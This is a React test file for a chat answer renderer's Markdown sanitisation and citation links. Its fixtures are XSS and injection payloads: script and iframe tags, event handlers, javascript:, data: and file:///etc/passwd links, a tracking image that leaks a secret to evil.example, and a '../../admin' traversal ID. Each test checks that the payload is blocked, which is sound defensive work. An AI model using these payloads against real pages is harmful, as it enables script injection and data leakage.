import { screen, within } from '@testing-library/react';
import { MemoryRouter } from 'react-router';
import { describe, expect, it } from 'vitest';

import { renderWithProviders } from '../../test/utils';
import { AnswerMarkdown } from './AnswerMarkdown';
import type { Citation } from './chatApi';
import { CITATION, IDS } from './fixtures';

function renderAnswer(text: string, citations: Citation[] = [CITATION]) {
  renderWithProviders(
    <MemoryRouter>
      <AnswerMarkdown text={text} citations={citations} />
    </MemoryRouter>,
  );
  return screen.getByTestId('answer');
}

describe('AnswerMarkdown', () => {
  it('renders Markdown with GFM tables and lists', () => {
    const answer = renderAnswer('**Rules**\n\n- one\n- two\n\n| a | b |\n|---|---|\n| 1 | 2 |');
    expect(within(answer).getByText('Rules').tagName).toBe('STRONG');
    expect(answer.querySelectorAll('li')).toHaveLength(2);
    expect(answer.querySelector('table')).not.toBeNull();
  });

  it('never renders raw HTML from the answer', () => {
    const answer = renderAnswer(
      'Hello <script>window.pwned = 1</script> <b onmouseover="x()">bold</b> ' +
        '<iframe src="https://evil.example"></iframe>\n\n<div onclick="alert(1)">block</div>',
    );
    expect(answer.querySelector('script, iframe, b, div[onclick], [onmouseover]')).toBeNull();
    expect(answer.innerHTML).not.toMatch(/onmouseover|onclick|<script/i);
    expect((window as { pwned?: number }).pwned).toBeUndefined();
  });

  it('does not load images: they become a link to their address', () => {
    const answer = renderAnswer(
      '![tracker](https://evil.example/pixel.png?leak=secret) and ![x](data:image/png;base64,AAAA)',
    );
    expect(answer.querySelector('img')).toBeNull();
    const link = within(answer).getByRole('link', { name: '[Image: tracker]' });
    expect(link).toHaveAttribute('href', 'https://evil.example/pixel.png?leak=secret');
    expect(link).toHaveAttribute('rel', 'noopener noreferrer nofollow');
    // A data: image is neither loaded nor linked.
    expect(within(answer).getByText('[Image: x]').closest('a')).toBeNull();
  });

  it('opens links in a new tab without a referrer and shows their domain', () => {
    const answer = renderAnswer('See [the policy](https://intranet.example.com/policy).');
    const link = within(answer).getByRole('link', { name: 'the policy' });
    expect(link).toHaveAttribute('target', '_blank');
    expect(link).toHaveAttribute('rel', 'noopener noreferrer nofollow');
    expect(within(answer).getByText('(intranet.example.com)')).toBeInTheDocument();
  });

  it('keeps javascript:, data: and other non-web links as plain text', () => {
    const answer = renderAnswer(
      '[click](javascript:alert(1)) [data](data:text/html,<script>alert(1)</script>) ' +
        '[file](file:///etc/passwd) [JS](JaVaScRiPt:alert(1)) <javascript:alert(1)> ' +
        // react-markdown already drops the dangerous ones; mailto: passes it and is stopped by the answer's own rule.
        '[mail](mailto:hr@example.com)',
    );
    expect(answer.querySelectorAll('a')).toHaveLength(0);
    expect(answer.innerHTML).not.toMatch(/href="(javascript|data|file):/i);
    expect(within(answer).getByText(/click/)).toBeInTheDocument();
  });

  it('turns validated citation markers into links to the protected viewer', () => {
    const answer = renderAnswer('File it two weeks ahead [c1].');
    const marker = within(answer).getByRole('link', { name: 'Source 1: handbook.pdf' });
    expect(marker).toHaveAttribute(
      'href',
      `/viewer/documents/${IDS.document}/versions/${IDS.version}?chunk=${IDS.chunk}`,
    );
    expect(marker).not.toHaveAttribute('target');
  });

  it('leaves unknown markers and markers in code untouched', () => {
    const answer = renderAnswer('Made up [c9]. Code `[c1]` stays.');
    expect(within(answer).queryByRole('link')).toBeNull();
    expect(answer).toHaveTextContent('Made up c9.');
    expect(within(answer).getByText('[c1]').tagName).toBe('CODE');
  });

  it('does not let a forged citation link reach another address', () => {
    const answer = renderAnswer('[c1](https://evil.example) and [x](#citation-c1)', [
      { ...CITATION, document_id: '../../admin' },
    ]);
    // A citation with invalid IDs gets no viewer link; a Markdown link keeps its real (external) address.
    expect(within(answer).getByRole('link', { name: 'c1' })).toHaveAttribute('href', 'https://evil.example/');
    expect(answer.querySelector('a[href*="admin"]')).toBeNull();
  });
});
